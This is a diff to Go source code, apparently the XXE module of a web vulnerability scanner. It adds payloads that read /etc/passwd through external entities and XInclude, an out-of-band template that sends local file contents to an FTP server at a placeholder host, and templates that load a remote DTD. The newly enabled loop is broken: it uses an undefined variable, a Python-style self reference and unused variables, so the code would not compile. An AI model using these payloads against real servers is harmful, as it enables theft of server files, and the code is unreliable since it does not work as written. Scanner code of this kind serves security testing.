@@ -14,6 +14,15 @@ var DefaultProxy = ""
 var cert string
 var mkey string
 
+var ftp_template = `<!ENTITY % bbb SYSTEM "file:///tmp/"><!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:%bbb;@%HOSTNAME%:%FTP_PORT%/b'>">`
+var ftp_client_file_template = `<!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:%bbb;@%HOSTNAME%:%FTP_PORT%/b'>">`
+
+//bind-xxe
+var reverse_template = []string{
+	`<!DOCTYPE convert [<!ENTITY % remote SYSTEM "%s">%remote;]>`,
+	`<!DOCTYPE uuu SYSTEM "%s">`,
+}
+
 func Xxe(args interface{}) (*util.ScanResult, error) {
 	var err error
 	util.Setup()
@@ -54,18 +63,19 @@ func Xxe(args interface{}) (*util.ScanResult, error) {
 	// 	return nil, err
 	// }
 
-	// var xmlversion bool
+	var xmlversion bool
 	reg := `^\s*<\?xml`
 	match, _ := regexp.MatchString(reg, string(body))
 	if match {
-		// xmlversion = true
+		xmlversion = true
 	}
-	// xmlversion_text := `<?xml version="1.0" encoding="UTF-8"?>`
+	xmlversion_text := `<?xml version="1.0" encoding="UTF-8"?>`
 	payloads := []string{
 		`<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>`,
 		`<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>`,
 	}
-	if funk.Contains(ContentType, "text/xml") {
+	//"application/xml;charset=UTF-8"
+	if funk.Contains(ContentType, "text/xml") || funk.Contains(ContentType, "application/xml") {
 		for _, pl := range payloads {
 			if strings.ToUpper(method) == "POST" {
 				req1, resp1, errs := sess.Post(url, headers, []byte(pl))
@@ -93,12 +103,12 @@ func Xxe(args interface{}) (*util.ScanResult, error) {
 		// 	`<!DOCTYPE foo SYSTEM "{}">`,
 		// }
 
-		// for _, pl := range bind_payloads {
-		// 	if xmlversion {
-		// 		pl_ := xmlversion_text + "\r\n" + pl
-		// 	}
-		// 	info := "xxe_" + self.parser.getfilepath()
-		// }
+		for _, pl := range bind_payloads {
+			if xmlversion {
+				pl_ := xmlversion_text + "\r\n" + pl
+			}
+			info := "xxe_" + self.parser.getfilepath()
+		}
 
 	}
 
